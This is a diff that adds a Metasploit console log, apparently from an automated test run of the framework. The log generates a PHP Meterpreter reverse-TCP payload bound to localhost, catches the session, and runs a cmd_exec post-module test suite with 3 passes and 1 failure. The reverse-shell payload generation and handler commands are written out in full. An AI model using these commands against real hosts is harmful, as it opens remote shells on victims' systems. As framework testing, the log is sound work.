@@ -1,0 +1,37 @@
+use php/meterpreter_reverse_tcp
+irb -e '(self.respond_to?(:framework) ? framework : self).datastore.user_defined.clear'
+setg SessionTlvLogging file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-3052-mzp95vtxt
+msf6 payload(php/meterpreter_reverse_tcp) > msf6 payload(php/meterpreter_reverse_tcp) > SessionTlvLogging => file:D:/a/_temp/phpmeterpreter_reverse_tcp_session_tlv_logging20231026-3052-mzp95vtxt
+msf6 payload(php/meterpreter_reverse_tcp) > generate -o D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20231026-3052-6lenod.php -f raw AutoVerifySessionTimeout=30 lport=6009 lhost=127.0.0.1 MeterpreterDebugLogging=rpath:D:/a/_temp/phpmeterpreter_reverse_tcp_debug_log20231026-3052-1mla3txt MeterpreterDebugBuild=true
+[*] Writing 34913 bytes to D:/a/_temp/child-process-rb-php-meterpreter-reverse-tcp20231026-3052-6lenod.php...
+msf6 payload(php/meterpreter_reverse_tcp) > to_handler
+[*] Payload Handler Started as Job 8
+msf6 payload(php/meterpreter_reverse_tcp) > 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6009 
+[*] Meterpreter session 9 opened (127.0.0.1:6009 -> 127.0.0.1:50046) at 2023-10-26 19:04:18 +0000
+use test/cmd_exec
+msf6 post(test/cmd_exec) > run session=9 AddEntropy=true Verbose=true
+[!] SESSION may not be compatible with this module:
+[!]  * missing Meterpreter features: stdapi_fs_chmod
+[*] Running against session 9
+[*] Session type is meterpreter and platform is windows
+[*] Starting cmd_exec tests
+[*] [should return the result of echo] meterpreter?
+[+] should return the result of echo
+[*] Session does not support sleep, skipping sleep tests
+[*] Finished cmd_exec tests
+[*] Starting cmd_exec quote tests
+[+] should return the result of echo with single quotes
+[+] should return the result of echo with double quotes
+[*] Starting cmd_exec stderr tests
+[-] FAILED: should return the stderr output
+[*] Testing complete in 1.23 seconds
+[-] Passed: 3; Failed: 1; Skipped: 0
+[*] Post module execution completed
+msf6 post(test/cmd_exec) > sessions -K
+jobs -K
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 9 closed.
+msf6 post(test/cmd_exec) > Stopping all jobs...
+msf6 post(test/cmd_exec) > 
